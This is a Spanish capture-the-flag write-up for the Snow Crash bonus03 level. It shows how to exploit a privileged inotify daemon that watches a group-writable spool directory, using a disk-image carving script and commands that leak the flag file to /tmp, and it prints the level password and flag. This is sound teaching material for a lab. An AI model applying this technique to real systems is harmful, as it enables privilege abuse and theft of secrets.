# Bonus03 — Snow Crash

> **Nivel bonus** · inotify · Spool `/var/spool/cic` · Manifiesto JSON `delivery.json`

| | |
|---|---|
| **Proyecto** | Snow Crash (42) |
| **Nivel** | `bonus03` |
| **Usuario de entrada** | `bonus03` |
| **Objetivo** | Credencial de `flagbonus03` |
| **Idea central** | Job JSON con `action: report` → `/tmp/cic_report` |

---

<a id="indice"></a>

## 📋 Índice

1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
2. 🗺️ [Mapa mental del ataque](#sec-2)
3. 📖 [Glosario rápido](#sec-3)
4. 🏷️ [Tipo de ejercicio](#sec-4)
5. 🎯 [Objetivo](#sec-5)
6. 🔑 [Acceso al nivel](#sec-6)
7. 🔍 [Localizar el componente del nivel](#sec-7)
8. ⚙️ [Identificar el servicio systemd](#sec-8)
9. 📥 [Localizar el directorio spool](#sec-9)
10. ⚠️ [Por qué no basta probar a ciegas](#sec-10)
11. 🔬 [Extraer el binario desde el VDI](#sec-11)
12. ✅ [Explotación](#sec-12)
13. 🏁 [Credencial final](#sec-13)
14. ⌨️ [Resumen de comandos válidos](#sec-14)
15. 💡 [Conceptos importantes](#sec-15)
16. 📦 [Conclusión](#sec-16)
17. 📁 [Estructura recomendada en el repositorio](#sec-17)
18. 📚 [Para seguir aprendiendo](#sec-18)
19. 🩹 [Errores frecuentes y qué significan](#sec-err)

> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.

---

<a id="sec-1"></a>

## 1. 🧭 ¿De qué va este nivel? (visión general)

Hay una **bandeja de entrada** (`/var/spool/cic`) vigilada por un conserje
automatizado (`cic`, usuario `flagbonus03`). Tú puedes dejar sobres en esa
bandeja porque perteneces al grupo `cic_grp`. Si el sobre se llama
**`delivery.json`** y pide la acción **`report`**, el conserje copia el
documento secreto a un casillero público: `/tmp/cic_report`.

No ejecutas el binario ni lees su código en la VM: dejas el formulario correcto
y lees el resultado.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-2"></a>

## 2. 🗺️ Mapa mental del ataque

```text
  [bonus03] ∈ cic_grp
        │  escribe delivery.json con action:report
        ▼
  /var/spool/cic/   (drwxrwsr-x  flagbonus03:cic_grp)
        │  inotify (creación / cierre de escritura)
        ▼
  cic.service  (User=flagbonus03)
        │  clasifica payload
        ▼
  lee /home/flagbonus03/.flag
  escribe /tmp/cic_report  (legible)
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-3"></a>

## 3. 📖 Glosario rápido

| Término | Analogía cotidiana | Qué es en la práctica |
|---------|-------------------|------------------------|
| **inotify** | Sensor en la bandeja de entrada | API de Linux para eventos del sistema de ficheros |
| **Spool** | Bandeja de trabajos pendientes | Directorio donde se depositan jobs |
| **Setgid en directorio (`rws`)** | Los papeles nuevos heredan el sello del grupo | Ficheros nuevos llevan grupo `cic_grp` |
| **Manifiesto JSON** | Formulario con casillas fijas | Fichero de control (`delivery.json`) |
| **Carve (VDI)** | Buscar el manual del conserje en el archivo del edificio | Extraer el ELF del disco virtual |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-4"></a>

## 4. 🏷️ Tipo de ejercicio

Explotación de un **daemon inotify** que procesa jobs en un directorio spool
escribible por el grupo del usuario. Al entregar un manifiesto JSON con la
acción correcta, el servicio (como `flagbonus03`) copia la flag a un fichero
legible en `/tmp`.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-5"></a>

## 5. 🎯 Objetivo

Obtener la credencial asociada a `flagbonus03`.

Pista del README:

```text
CIC watches everything. Even the things you think you hid.
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-6"></a>

## 6. 🔑 Acceso al nivel

```bash
ssh bonus03@localhost -p 2424
# password: cfiioecfib9aobid1abfa0ci8
whoami; id; cat README
```

Debes ver el grupo **`cic_grp`**.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-7"></a>

## 7. 🔍 Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus03
```

```text
-rwxr-x---  1 flagbonus03 flagbonus03 17056 ... cic
```

`bonus03` **no** puede ejecutarlo ni leerlo.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-8"></a>

## 8. ⚙️ Identificar el servicio systemd

```bash
systemctl cat cic.service
systemctl status cic.service --no-pager
```

```ini
[Service]
Type=forking
User=flagbonus03
Group=flagbonus03
ExecStart=/opt/snowcrash/bonus03/cic
Restart=always
```

Es un **daemon de spool con inotify**. El servicio ya está `active (running)`.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-9"></a>

## 9. 📥 Localizar el directorio spool

```bash
ls -la /var/spool
ls -la /var/spool/cic
```

```text
drwxrwsr-x  2 flagbonus03 cic_grp ... cic
```

| Elemento | Significado |
|----------|-------------|
| `/var/spool/cic` | Spool vigilado |
| `rws` en grupo | setgid: nuevos ficheros heredan `cic_grp` |
| Escritura de grupo | `bonus03` puede crear ficheros aquí |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-10"></a>

## 10. ⚠️ Por qué no basta probar a ciegas

Pruebas típicas que **no** disparan la acción correcta:

- Texto arbitrario → permanece sin procesar
- Symlink al `.flag` → no se trata como report
- Script shell en el spool → no se ejecuta

Hace falta el **nombre y formato** exactos del job. Como el binario no es
legible en la VM, se obtiene analizándolo desde el host.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-11"></a>

## 11. 🔬 Extraer el binario desde el VDI

En el host, carve anclado a `/opt/snowcrash/bonus03/cic` (no solo a la ruta del
directorio spool, que puede aparecer en otros sitios del disco).

Tamaño: **17056** bytes.

Cadenas relevantes:

```text
/var/spool/cic
inotify_init1
inotify_add_watch
delivery.json
"action":"report"
"action": "report"
/home/flagbonus03/.flag
/tmp/cic_report
inbound delivery received, dispatching
```

| Elemento | Valor |
|----------|--------|
| Job | `delivery.json` |
| Acción | `"action":"report"` |
| Fuente | `/home/flagbonus03/.flag` |
| Destino | `/tmp/cic_report` |

### Script completo de carve (host)

```bash
python3 << 'EOF'
import mmap, os, sys

candidates = [
    "/home/sternero/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
    "/sgoinfre/students/sternero/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
]
vdi = next((p for p in candidates if os.path.isfile(p)), None)
if not vdi:
    print("VDI not found")
    sys.exit(1)

needles = [b"/opt/snowcrash/bonus03/cic", b"bonus03/cic"]
out = "/tmp/cic_bin"
size_guess = 17056
max_back = 500_000

with open(vdi, "rb") as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    found = None
    for n in needles:
        pos = 0
        while True:
            pos = mm.find(n, pos)
            if pos < 0:
                break
            start = max(0, pos - max_back)
            elf_rel = mm[start:pos].rfind(b"\x7fELF")
            if elf_rel >= 0:
                elf_off = start + elf_rel
                blob = mm[elf_off:elf_off + size_guess + 8192]
                if b"/var/spool/cic" in blob or b"inotify" in blob:
                    print(f"candidate {n!r} pos={pos} elf={elf_off}")
                    open(out, "wb").write(mm[elf_off:elf_off + size_guess])
                    found = elf_off
                    break
            pos += 1
        if found is not None:
            break
    mm.close()
    if found is None:
        print("no suitable ELF")
        sys.exit(1)
    print(f"wrote -> {out}")
EOF

file /tmp/cic_bin
strings -a /tmp/cic_bin | grep -iE 'spool|inotify|delivery|report|flag|/tmp'
```

**Por qué anclar a `/opt/snowcrash/bonus03/cic`:** la cadena `/var/spool/cic`
también aparece en el disco como **entrada de directorio**. Si buscas solo eso,
puedes “sacar” otro binario por error (por ejemplo el de otro nivel). La ruta
del ejecutable es mucho más específica.


<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-12"></a>

## 12. ✅ Explotación

```bash
rm -f /var/spool/cic/* /tmp/cic_report 2>/dev/null
echo '{"action":"report"}' > /var/spool/cic/delivery.json
sleep 2
ls -la /tmp/cic_report
cat /tmp/cic_report
```

```text
mof3b3iud5c3p35bsv9aua0bj
```

También vale `{"action": "report"}` (espacio tras `:`).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-13"></a>

## 13. 🏁 Credencial final

```text
mof3b3iud5c3p35bsv9aua0bj
```

→ `bonus03/flag` y contraseña de `bonus04`.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-14"></a>

## 14. ⌨️ Resumen de comandos válidos

```bash
systemctl cat cic.service
ls -la /var/spool/cic
echo '{"action":"report"}' > /var/spool/cic/delivery.json
sleep 2
cat /tmp/cic_report
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-15"></a>

## 15. 💡 Conceptos importantes

- inotify como API de eventos de ficheros
- Spool escribible por grupo + daemon privilegiado
- Setgid en directorios
- Manifiesto JSON como trigger (no RCE arbitrario del script)
- Carve anclado a cadenas del **binario**, no solo a rutas de directorio

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-16"></a>

## 16. 📦 Conclusión

Formulario correcto en la bandeja → flag en `/tmp`. Credencial:

```text
mof3b3iud5c3p35bsv9aua0bj
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-17"></a>

## 17. 📁 Estructura recomendada en el repositorio

```text
bonus03/
├── flag
└── resources/
    └── bonus03.md
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-18"></a>

## 18. 📚 Para seguir aprendiendo

| Tema | Pista |
|------|--------|
| inotify | `man inotify` |
| Colas de trabajo | diseño de spools y least privilege |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>


---

<a id="sec-err"></a>

## 19. 🩹 Errores frecuentes y qué significan

Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
causa concreta. Esta tabla resume los síntomas más habituales de **bonus03**,
qué suelen querer decir y el siguiente comando o acción razonable.

| Síntoma | Causa probable | Qué hacer |
|---------|----------------|-----------|
| Ficheros en el spool no desaparecen / no pasa nada | Nombre o JSON incorrectos | El job debe llamarse **`delivery.json`** con `"action":"report"`. |
| `Permission denied` al escribir en `/var/spool/cic` | No estás en `cic_grp` | `id` debe incluir `cic_grp`. |
| Symlink al `.flag` no da resultado | El daemon no trata el job como report | Usa el manifiesto JSON, no confíes solo en symlinks. |
| No existe `/tmp/cic_report` | El servicio no procesó el job o falló | `systemctl is-active cic.service`; revisa el JSON; espera 1–2 s. |
| `strings` del binario: Permission denied | `cic` no es legible por `bonus03` | Carve del ELF en el **host**. |
| Carve saca `kourier` u otro binario | Aguja `/var/spool/cic` demasiado genérica | Ancla a `/opt/snowcrash/bonus03/cic`. |

**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
(a menudo un error se resuelve y aparece el siguiente de la lista).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<div align="center">

**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**

*Snow Crash · bonus03 · material didáctico de resolución*

</div>
